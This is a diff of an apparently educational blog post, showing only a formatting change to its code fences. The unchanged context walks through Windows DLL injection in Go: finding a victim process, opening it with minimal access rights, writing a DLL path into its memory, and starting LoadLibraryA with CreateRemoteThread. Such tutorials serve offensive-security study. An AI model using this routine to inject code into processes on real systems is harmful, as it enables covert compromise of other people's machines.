@@ -18,7 +18,7 @@ First of all, we need to be able to get a handle on the process we want to injec
 To do that, we'll take a snapshot of the currently running processes with the `CreateToolhelp32Snapshot`. The `TH32CS_SNAPPROCESS` parameter allows us to enumerate all processes on the system.
 We can then use `Process32First` to get a pointer to the first `PROCESSENTRY32` and `Process32Next` to iterate through all the entries. Since we are running a 64-bit process and enumerating other 64-bits processes, simply checking the `szExeFile` attribute of the `PROCESSENTRY32` struct will give us the executable name for the process, which we can then check to see if it matches what we are looking for.
 
-```
+```go
 processesSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 defer windows.CloseHandle(processesSnap)
 if err != nil {
@@ -48,7 +48,7 @@ As you can see, I am not stopping at the first match. Rather, I store all of the
 
 Armed with the PID of the victim process, we now can go ahead and get a handle for it. During my tests, I found that `PROCESS_CREATE_THREAD`, `PROCESS_VM_WRITE`, `PROCESS_VM_READ`, `PROCESS_VM_OPERATION` are the minimum access rights required to successfully perform DLL injection. This is better than `PROCESS_ALL_ACCESS` that sometimes pops up but still will require to get `SeDebugPrivilege` in some cases. I will discuss that in a later post.
 
-```
+```go
 victimProcess, err := windows.OpenProcess(
 	windows.PROCESS_CREATE_THREAD|
 		windows.PROCESS_VM_WRITE|
@@ -61,7 +61,7 @@ defer windows.CloseHandle(victimProcess)
 
 Once we have a handle for the process, we need to allocate enough space on the memory of the victim process to fit the path to the DLL we want to inject. We can do this with `VirtualAllocEx`. A pattern that will come up more often is that the functions I need are not defined in the `windows` Go package, so I have to manually load them.
 
-```
+```go
 var (
 	kernel32DLL        = windows.NewLazyDLL("kernel32.dll")
 	virtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
@@ -82,7 +82,7 @@ if addr == 0 {
 
 `VirtuallAllocEx` returns a pointer to the beginning of the region we allocated on the target process. This means we can also use this pointer as a starting point to copy our DLL path with `WriteProcessMemory` (also not pre-defined).
 
-```
+```go
 buffer := []byte(targetDLL)
 var writtenBytes uint64 = 0
 r1, _, err := writeProcessMemory.Call(
@@ -100,7 +100,7 @@ fmt.Printf("[+] Written %d bytes to remote process\n", writtenBytes)
 
 We now need to get the address of `LoadLibraryA`, defined in `kernel32.dll` so that we can later start a new thread to execute it. Interestingly, getting the address of the functions in the local process rather than in the remote one works fine. You can find out more about why that is in [this Stackoverflow thread](https://stackoverflow.com/questions/22750112/dll-injection-with-createremotethread). Because of this, getting the address of `LoadLibraryA` is as simple as calling `GetProcAddress`.
 
-```
+```go
 moduleName, err := windows.UTF16FromString("kernel32.dll")
 if err != nil {
 	log.Fatal(err)
@@ -118,7 +118,7 @@ if err != nil {
 
 Finally, we can launch a new thread to execute `LoadLibraryA`, using the DLL path we wrote to the remote memory as an argument. We can use `CreateRemoteThread` to launch a thread in a remote process, passing the address of `LoadLibraryA` as `lpStartAddress` and the address we got from `VirtuallAllocEx` as `lpParameter`.
 
-```
+```go
 createRemoteThread := kernel32DLL.NewProc("CreateRemoteThread")
 r1, _, err = createRemoteThread.Call(
 	uintptr(victimProcess),
